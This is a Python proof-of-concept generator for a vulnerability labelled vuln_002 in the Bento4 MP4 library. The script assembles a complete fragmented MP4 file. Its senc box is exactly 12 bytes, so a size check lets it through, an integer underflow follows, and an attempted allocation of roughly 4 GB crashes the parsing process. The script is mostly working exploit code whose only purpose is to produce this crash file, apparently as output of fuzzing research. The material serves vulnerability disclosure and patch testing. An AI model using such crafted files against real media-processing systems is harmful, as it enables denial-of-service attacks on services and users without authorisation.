#!/usr/bin/env python3
"""
PoC generator for vuln_002:
SENC Atom Minimum Size Check Too Loose -> Integer Underflow in payload_size
-> Uncontrolled ~4 GB Allocation -> Process Crash

AP4_SencAtom::Create() only checks size < 12. When size == 12, it passes.
Inside constructor: payload_size = size - header_size - 4 = 12 - 16 = 0xFFFFFFFC (underflow)
Then SetDataSize(0xFFFFFFFC) tries to allocate ~4 GB -> std::bad_alloc -> crash
"""
import struct
import os

OUTPUT = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommonEncryption_h/vuln_002.mp4'

def box(type4, data):
    return struct.pack('>I', 8 + len(data)) + type4 + data

def fullbox(type4, version, flags, data):
    hdr = bytes([version]) + flags.to_bytes(3, 'big')
    return box(type4, hdr + data)

# ---- ftyp ----
ftyp = box(b'ftyp', b'iso5' + struct.pack('>I', 0) + b'iso5' + b'iso6' + b'mp41')

# ---- moov ----
# mvhd version 0 (108 bytes total)
mvhd_data  = struct.pack('>IIIII', 0, 0, 44100, 0, 0x00010000)
mvhd_data += struct.pack('>H', 0x0100)
mvhd_data += b'\x00' * 10
mvhd_data += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_data += b'\x00' * 24
mvhd_data += struct.pack('>I', 2)
mvhd = fullbox(b'mvhd', 0, 0, mvhd_data)

# tkhd version 0 (92 bytes total)
tkhd_data  = struct.pack('>IIII', 0, 0, 1, 0)   # creation, modification, track_id, reserved
tkhd_data += struct.pack('>II', 0, 0)            # duration, reserved[2]
tkhd_data += struct.pack('>HH', 0, 0)            # layer, alternate_group
tkhd_data += struct.pack('>H', 0x0100)           # volume
tkhd_data += struct.pack('>H', 0)                # reserved
tkhd_data += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
tkhd_data += struct.pack('>II', 0, 0)            # width, height
tkhd = fullbox(b'tkhd', 0, 3, tkhd_data)        # flags=3 (track_enabled|track_in_movie)

# mdhd version 0
mdhd_data  = struct.pack('>IIIII', 0, 0, 44100, 0, 0)  # times, timescale, duration, language+pre_defined
mdhd = fullbox(b'mdhd', 0, 0, mdhd_data)

# hdlr for audio
hdlr_data  = struct.pack('>I', 0)       # pre_defined
hdlr_data += b'soun'                    # handler_type
hdlr_data += b'\x00' * 12              # reserved
hdlr_data += b'SoundHandler\x00'
hdlr = fullbox(b'hdlr', 0, 0, hdlr_data)

# smhd
smhd = fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

# dinf > dref > url
url_ = fullbox(b'url ', 0, 1, b'')     # flags=1 -> self-contained
dref = fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_)
dinf = box(b'dinf', dref)

# stbl - minimal: stsd + stts + stsc + stsz + stco
# mp4a sample entry
mp4a_data  = b'\x00' * 6               # reserved
mp4a_data += struct.pack('>H', 1)      # data_reference_index
mp4a_data += b'\x00' * 8              # reserved
mp4a_data += struct.pack('>HH', 2, 16)  # channelcount, samplesize
mp4a_data += struct.pack('>HH', 0, 0)  # pre_defined, reserved
mp4a_data += struct.pack('>I', 44100 << 16)  # samplerate (fixed 16.16)
mp4a = box(b'mp4a', mp4a_data)

stsd = fullbox(b'stsd', 0, 0, struct.pack('>I', 1) + mp4a)
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))   # entry_count=0
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))   # entry_count=0
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))  # sample_size=0, count=0
stco = fullbox(b'stco', 0, 0, struct.pack('>I', 0))   # entry_count=0

stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)

minf = box(b'minf', smhd + dinf + stbl)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)

# mvex with trex (required for fragmented MP4)
trex = fullbox(b'trex', 0, 0, struct.pack('>IIIII', 1, 1, 0, 0, 0))
mvex = box(b'mvex', trex)

moov = box(b'moov', mvhd + trak + mvex)

# ---- moof ----
# mfhd (sequence_number=1)
mfhd = fullbox(b'mfhd', 0, 0, struct.pack('>I', 1))

# tfhd (track_id=1, no extra flags)
tfhd = fullbox(b'tfhd', 0, 0, struct.pack('>I', 1))

# senc box: EXACTLY 12 bytes
# 4 bytes size (=12) + 4 bytes 'senc' + 1 byte version(0) + 3 bytes flags(0)
# This passes the `size < 12` check but triggers underflow:
#   payload_size = 12 - 16 = 0xFFFFFFFC (~4 GB)
senc = struct.pack('>I', 12) + b'senc' + b'\x00\x00\x00\x00'
assert len(senc) == 12, f"senc must be 12 bytes, got {len(senc)}"

traf = box(b'traf', tfhd + senc)
moof = box(b'moof', mfhd + traf)

# ---- mdat ----
mdat = box(b'mdat', b'\x00' * 4)

mp4 = ftyp + moov + moof + mdat

os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, 'wb') as f:
    f.write(mp4)
print(f"Written {len(mp4)} bytes to {OUTPUT}")
print(f"senc box bytes: {senc.hex()}")
